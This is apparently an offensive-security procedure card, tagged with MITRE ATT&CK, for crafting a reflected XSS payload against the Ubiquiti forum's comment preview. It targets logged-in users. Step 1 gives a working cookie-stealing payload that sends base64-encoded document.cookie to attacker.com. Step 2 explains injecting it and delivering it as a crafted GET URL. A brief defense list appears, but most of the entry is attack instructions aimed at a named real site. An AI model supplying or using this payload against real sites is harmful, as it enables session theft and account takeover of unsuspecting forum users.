---
id: proc-ubnt-payload-001
tags:
  - xss
  - payload
  - javascript
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:47:18.327Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-Reflected-XSS-Payload

## Summary

This procedure details creating a malicious JavaScript payload for injection into the Ubiquiti forum's comment field, exploiting the lack of sanitization in the preview function to enable reflected XSS.

## Description

The vulnerability stems from user input in the HTML comment field being rendered unsanitized during preview, passed via GET parameters. Payloads like script tags execute arbitrary JS in the victim's browser upon preview or URL visit. This targets logged-in users for session theft or phishing. Prerequisites include access to the new discussion page; outcomes involve a crafted URL ready for delivery, with escalation potential via drafts.

## Requirements

1. Understanding of JavaScript and HTML encoding to evade basic filters
2. Access to the forum page from previous procedure
3. Attacker-controlled domain for exfiltration (e.g., to capture cookies)

## Defense

Defensive measures and detection strategies:

- Sanitize all user inputs with HTML entity encoding before rendering
- Implement Content Security Policy (CSP) to block inline scripts
- Monitor for script tags or unusual JS in input logs

## Objectives

1. Construct a payload that executes without detection
2. Ensure reflection via GET for URL-based delivery
3. Test for immediate execution in preview

## Instructions

### Step 1: Select Payload Type

**Context**: Choose a simple test or advanced exfiltration payload based on goals.

For testing, use `<script>alert('XSS');</script>`. For exploitation, use `<script>fetch('http://attacker.com/steal?data='+btoa(document.cookie));</script>` to send base64-encoded cookies.

> Payload must be HTML/JS compatible; avoid quotes if the field escapes them.

### Step 2: Inject into Comment Field

**Context**: Enter the payload to confirm it passes validation.

Paste the payload into the comment textarea. Observe if the form accepts it without stripping tags.

> If accepted, the payload will appear in the generated GET URL upon preview, e.g., ?preview=1&comment=<script>...

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[payload]]
- [[JavaScript]]
